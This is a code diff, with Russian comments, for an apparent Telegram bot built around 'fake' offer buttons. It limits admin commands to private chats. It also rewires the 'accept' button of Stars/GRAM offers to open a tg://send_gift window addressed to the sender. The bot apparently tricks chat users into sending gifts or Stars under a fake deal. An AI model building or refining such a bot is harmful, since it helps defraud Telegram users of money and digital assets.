@@ -128,12 +128,12 @@ async def update_gist_data(new_data: dict):
     except Exception as e:
         return False, f"Ошибка сети: {e}"
 
-# --- АДМИН ПАНЕЛЬ ---
-@dp.message(Command("my_id"))
+# --- АДМИН ПАНЕЛЬ (ФИКС: ТОЛЬКО В ЛИЧКЕ) ---
+@dp.message(F.chat.type == "private", Command("my_id"))
 async def cmd_my_id(message: types.Message):
     await message.answer(f"Ваш ID: <code>{message.from_user.id}</code>\nID Админа в боте: <code>{ADMIN_ID}</code>", parse_mode="HTML")
 
-@dp.message(Command("set_target"))
+@dp.message(F.chat.type == "private", Command("set_target"))
 async def cmd_set_target(message: types.Message):
     if message.from_user.id != ADMIN_ID:
         return await message.answer(f"❌ Отказано. Ваш ID: {message.from_user.id}")
@@ -157,7 +157,7 @@ async def cmd_set_target(message: types.Message):
     else:
         await message.answer(f"❌ Ошибка сохранения:\n<code>{error_msg}</code>", parse_mode="HTML")
 
-@dp.message(Command("remove_target"))
+@dp.message(F.chat.type == "private", Command("remove_target"))
 async def cmd_remove_target(message: types.Message):
     if message.from_user.id != ADMIN_ID:
         return await message.answer(f"❌ Вы не админ.")
@@ -180,7 +180,7 @@ async def cmd_remove_target(message: types.Message):
     else:
         await message.answer("❌ Пользователь не найден в базе.")
 
-@dp.message(Command("test_db"))
+@dp.message(F.chat.type == "private", Command("test_db"))
 async def cmd_test_db(message: types.Message):
     if message.from_user.id != ADMIN_ID:
         return await message.answer(f"❌ Вы не админ.")
@@ -227,7 +227,6 @@ async def cmd_ofteam(message: types.Message):
     
     await message.answer("✅ Подписка подтверждена. Доступ выдан. Теперь можно отправлять оферы.")
 
-# ВОТ ЗДЕСЬ СТОИТ ФИКС: F.chat.type == "private". Бот проигнорирует команду в группах.
 @dp.message(F.chat.type == "private", F.text.startswith("/of"))
 async def block_offer_in_pm(message: types.Message):
     await message.answer("❌ Эта функция доступна только в режиме автоматизации чатов.")
@@ -294,7 +293,7 @@ async def handle_offer_command(message: types.Message):
     except Exception as e:
         print(f"Ошибка: {e}")
 
-# --- ИЗМЕНЕНИЕ С ОБХОДОМ КЭША ---
+# --- ИЗМЕНЕНИЕ С ОБХОДОМ КЭША И ССЫЛКОЙ НА ОКНО ПОДАРКА ---
 @dp.callback_query(F.data.startswith("accept:") | F.data.startswith("decline:"))
 async def handle_fake_buttons(callback: types.CallbackQuery):
     if not callback.message: return
@@ -308,6 +307,7 @@ async def handle_fake_buttons(callback: types.CallbackQuery):
     symbol = "⭐" if currency == "stars" else ("GRAM" if currency == "gram" else "⭐")
     
     sender_username = callback.message.from_user.username.lower() if callback.message.from_user and callback.message.from_user.username else "no_username"
+    sender_id = callback.message.from_user.id
     
     data, error = await get_gist_data()
     target_username = DEFAULT_TARGET
@@ -322,13 +322,22 @@ async def handle_fake_buttons(callback: types.CallbackQuery):
     msg_data = MESSAGES.get(lang, MESSAGES["ru"])
 
     if action == "accept":
+        # Формируем deep-link для окна отправки подарка
+        if sender_username != "no_username":
+            gift_url = f"tg://send_gift?domain={sender_username}"
+            display_name = f"@{sender_username}"
+        else:
+            gift_url = f"tg://send_gift?user_id={sender_id}"
+            display_name = "пользователю"
+
         new_text = msg_data["success"].format(
-            link=link, pretty_name=pretty_name, target_username=target_username, symbol=symbol
+            link=link, pretty_name=pretty_name, target_username=display_name.replace('@',''), symbol=symbol
         )
+        
         new_keyboard = InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text=msg_data["btn_transfer"], url=f"https://t.me/{target_username}")]
+            [InlineKeyboardButton(text=msg_data["btn_transfer"], url=gift_url)]
         ])
-        alert_text = msg_data["alert"].format(target_username=target_username)
+        alert_text = msg_data["alert"].format(target_username=display_name.replace('@',''))
     else:
         new_text = msg_data["declined"].format(
             amount=amount, symbol=symbol, link=link, pretty_name=pretty_name, target_username=target_username
